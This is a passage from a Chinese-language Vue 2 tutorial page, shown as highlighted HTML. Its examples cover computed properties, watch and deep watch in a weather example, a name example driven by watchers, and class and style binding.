class="string">&#x27;-&#x27;</span>+<span class="built_in">this</span>.lastName</span></span><br><span class="line">&#125;*/</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="14-天气案例"><a href="#14-天气案例" class="headerlink" title="14.天气案例"></a>14.天气案例</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>天气案例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>今天天气很&#123;&#123;info&#125;&#125;！<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;change&quot;</span>&gt;</span>切换天气<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">isHost: <span class="literal">true</span></span></span><br><span class="line">&#125;,</span><br><span class="line">methods:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">change</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.isHost = !<span class="built_in">this</span>.isHost</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">computed:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">info</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">this</span>.isHost?<span class="string">&#x27;炎热&#x27;</span>:<span class="string">&#x27;凉爽&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="15-监视属性-天气案例"><a href="#15-监视属性-天气案例" class="headerlink" title="15.监视属性-天气案例"></a>15.监视属性-天气案例</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>监视属性-天气案例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">监视属性watch：</span></span><br><span class="line"><span class="comment">1.当被监视的属性发生变化时，handler回调函数会自动调用，执行相关操作；</span></span><br><span class="line"><span class="comment">2.监视的属性必须存在，才能被监视；</span></span><br><span class="line"><span class="comment">3.监视的两种方法：</span></span><br><span class="line"><span class="comment">(1).new Vue时传入watch配置；</span></span><br><span class="line"><span class="comment">(2).通过vm.$watch()监视；</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>今天天气很&#123;&#123;info&#125;&#125;！<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;change&quot;</span>&gt;</span>切换天气<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">isHost: <span class="literal">true</span></span></span><br><span class="line">&#125;,</span><br><span class="line">methods:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">change</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.isHost = !<span class="built_in">this</span>.isHost</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">computed:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">info</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">this</span>.isHost?<span class="string">&#x27;炎热&#x27;</span>:<span class="string">&#x27;凉爽&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="comment">//监视属性第一种写法</span></span></span><br><span class="line">/*watch:&#123;//监视</span><br><span class="line"><span class="javascript"><span class="comment">//监视isHost属性</span></span></span><br><span class="line">isHost:&#123;</span><br><span class="line"><span class="javascript">immediate:<span class="literal">true</span>,<span class="comment">//初始化时，让handler函数调用一下。</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//handler什么时候调用？当isHost发生改变时。</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">handler</span>(<span class="params">newValue,oldValue</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;isHost发生改变,改变前：&#x27;</span>+oldValue+<span class="string">&#x27;  改变后：&#x27;</span>+newValue)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;*/</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//监视属性第二种写法</span></span></span><br><span class="line"><span class="javascript">vm.$watch(<span class="string">&#x27;isHost&#x27;</span>,&#123;</span></span><br><span class="line"><span class="javascript">immediate:<span class="literal">true</span>,<span class="comment">//初始化时，让handler函数调用一下。</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//handler什么时候调用？当isHost发生改变时。</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">handler</span>(<span class="params">newValue,oldValue</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;isHost发生改变,改变前：&#x27;</span>+oldValue+<span class="string">&#x27;  改变后：&#x27;</span>+newValue)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="16-深度监视属性-天气案例"><a href="#16-深度监视属性-天气案例" class="headerlink" title="16.深度监视属性-天气案例"></a>16.深度监视属性-天气案例</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>深度监视属性-天气案例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">深度监视：</span></span><br><span class="line"><span class="comment">1.Vue中的watch默认不监视对象内部值的改变（一层）；</span></span><br><span class="line"><span class="comment">2.配置deep:true可以监视对象内部值的改变（多层）；</span></span><br><span class="line"><span class="comment">备注：</span></span><br><span class="line"><span class="comment">1.Vue自身可以监视对象内部值的改变，但Vue提供的watch默认不可以；</span></span><br><span class="line"><span class="comment">2.使用watch时根据数据的具体结构，决定是否采用深度监视；</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>今天天气很&#123;&#123;info&#125;&#125;！<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;change&quot;</span>&gt;</span>切换天气<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>a的值是：&#123;&#123;numbers.a&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;numbers.a++&quot;</span>&gt;</span>点我让a+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>b的值是：&#123;&#123;numbers.b&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;numbers.b++&quot;</span>&gt;</span>点我让b+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">isHost: <span class="literal">true</span>,</span></span><br><span class="line">numbers:&#123;</span><br><span class="line">a:1,</span><br><span class="line">b:2</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">methods:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">change</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.isHost = !<span class="built_in">this</span>.isHost</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">computed:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">info</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">this</span>.isHost?<span class="string">&#x27;炎热&#x27;</span>:<span class="string">&#x27;凉爽&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript">watch:&#123;<span class="comment">//监视</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//监视isHost属性的变化</span></span></span><br><span class="line">isHost:&#123;</span><br><span class="line"><span class="javascript"><span class="comment">//immediate:true,//初始化时，让handler函数调用一下。</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//handler什么时候调用？当isHost发生改变时。</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">handler</span>(<span class="params">newValue,oldValue</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;isHost发生改变,改变前：&#x27;</span>+oldValue+<span class="string">&#x27;  改变后：&#x27;</span>+newValue)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="comment">//监视多级结构中“某个”属性的变化</span></span></span><br><span class="line"><span class="javascript"><span class="comment">/*&#x27;numbers.a&#x27;:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//immediate:true,//初始化时，让handler函数调用一下。</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//handler什么时候调用？当isHost发生改变时。</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">handler</span>(<span class="params">newValue,oldValue</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;a发生改变,改变前：&#x27;</span>+oldValue+<span class="string">&#x27;  改变后：&#x27;</span>+newValue)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,*/</span><br><span class="line"><span class="javascript"><span class="comment">//监视多级结构中“所有”属性的变化</span></span></span><br><span class="line">numbers:&#123;</span><br><span class="line"><span class="javascript"><span class="comment">//immediate:true,//初始化时，让handler函数调用一下。</span></span></span><br><span class="line"><span class="javascript">deep:<span class="literal">true</span>,<span class="comment">//开启深度监视属性</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">handler</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;numbers发生改变&#x27;</span>)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="17-计算属性—姓名案例（watch监视实现）"><a href="#17-计算属性—姓名案例（watch监视实现）" class="headerlink" title="17.计算属性—姓名案例（watch监视实现）"></a>17.计算属性—姓名案例（watch监视实现）</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>计算属性—姓名案例（watch监视实现）<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">computed和watch之间的区别：</span></span><br><span class="line"><span class="comment">1.computed能实现的功能，watch都能实现；</span></span><br><span class="line"><span class="comment">2.watch能完成的功能，computed不一定能完成（比如：watch可以进行异步操作）</span></span><br><span class="line"><span class="comment">两个重要的小原则：</span></span><br><span class="line"><span class="comment">1.所有被Vue管理的函数，最好写成普通函数，这样this的指向才是vm或者组件实例对象；</span></span><br><span class="line"><span class="comment">2.所有不被Vue管理的函数（定时器回调函数，ajax回调函数等），最好写成箭头函数，这样this的指向才是vm或者组件实例对象；</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">姓：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;lastName&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">姓名：<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">firstName:<span class="string">&#x27;张&#x27;</span>,</span></span><br><span class="line"><span class="javascript">lastName:<span class="string">&#x27;三&#x27;</span>,</span></span><br><span class="line"><span class="javascript">fullName:<span class="string">&#x27;张-三&#x27;</span></span></span><br><span class="line">&#125;,</span><br><span class="line">/*computed:&#123;</span><br><span class="line"><span class="javascript"><span class="comment">//完整写法</span></span></span><br><span class="line">fullName:&#123;</span><br><span class="line"><span class="javascript"><span class="comment">//当有人读取fullName属性时，就会调用get()，且返回值作为fullName的属性值</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//get()调用的时机：1.初次读取fullName时。2.所依赖的数据发生改变时。</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">get</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">this</span>.firstName+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">this</span>.lastName</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="comment">//set()调用的时机：1.当fullName被修改时时。</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">set</span>(<span class="params">value</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> arr = value.split(<span class="string">&#x27;-&#x27;</span>)</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.firstName = arr[<span class="number">0</span>]</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.lastName = arr[<span class="number">1</span>]</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,*/</span><br><span class="line">watch:&#123;</span><br><span class="line">firstName:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">handler</span>(<span class="params">newValue</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">//定时器回调函数,延迟1秒设值</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;<span class="comment">//不是Vue管理的函数，写为箭头函数的this是vm或组件实例对象；</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="built_in">this</span>)</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.fullName = newValue + <span class="string">&#x27;-&#x27;</span> +<span class="built_in">this</span>.lastName</span></span><br><span class="line">&#125;,1000);</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//setTimeout(function()&#123;//不是Vue管理的函数，写为普通函数的this不是vm或组件实例对象；</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//console.log(this)</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//this.fullName = newValue + &#x27;-&#x27; +this.lastName</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//&#125;,1000);</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">lastName:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">handler</span>(<span class="params">newValue</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.fullName = <span class="built_in">this</span>.firstName + <span class="string">&#x27;-&#x27;</span> + newValue</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="18-绑定样式"><a href="#18-绑定样式" class="headerlink" title="18.绑定样式"></a>18.绑定样式</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>绑定样式<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">.basic&#123;</span><br><span class="line"><span class="css"><span class="attribute">width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">border</span>: <span class="number">1px</span> solid black;</span></span><br><span class="line">&#125;</span><br><span class="line">.happy&#123;</span><br><span class="line"><span class="css"><span class="attribute">background-color</span>: greenyellow;</span></span><br><span class="line">&#125;</span><br><span class="line">.sad&#123;</span><br><span class="line"><span class="css"><span class="attribute">background-color</span>: <span class="number">#aaaaaa</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">border</span>: <span class="number">5px</span> dotted green;</span></span><br><span class="line">&#125;</span><br><span class="line">.normal&#123;</span><br><span class="line"><span class="css"><span class="attribute">background-color</span>: gold;</span></span><br><span class="line">&#125;</span><br><span class="line">.atguigu1&#123;</span><br><span class="line"><span class="css"><span class="attribute">width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">background-color</span>: green;</span></span><br><span class="line"><span class="css"><span class="attribute">border</span>: <span class="number">1px</span> solid black;</span></span><br><span class="line">&#125;</span><br><span class="line">.atguigu2&#123;</span><br><span class="line"><span class="css"><span class="attribute">font-size</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">font-style</span>: inherit;</span></span><br><span class="line">&#125;</span><br><span class="line">.atguigu3&#123;</span><br><span class="line"><span class="css"><span class="attribute">border-radius</span>: <span class="number">10px</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--绑定class样式--字符串写法，适用于：样式类名不确定，需要动态指定--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;mood&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;changeMood&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--绑定class样式--数组写法，适用于：要绑定的样式个数不确定，名字也不确定--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;classArr&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--绑定class样式--对象写法，适用于：要绑定的样式个数确定，名字也确定，但要动态决定用不用--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;classObj&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--绑定style样式--对象写法--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;styleObj1&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--绑定style样式--数组写法--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;[styleObj1,styleObj2]&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;styleArr&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span 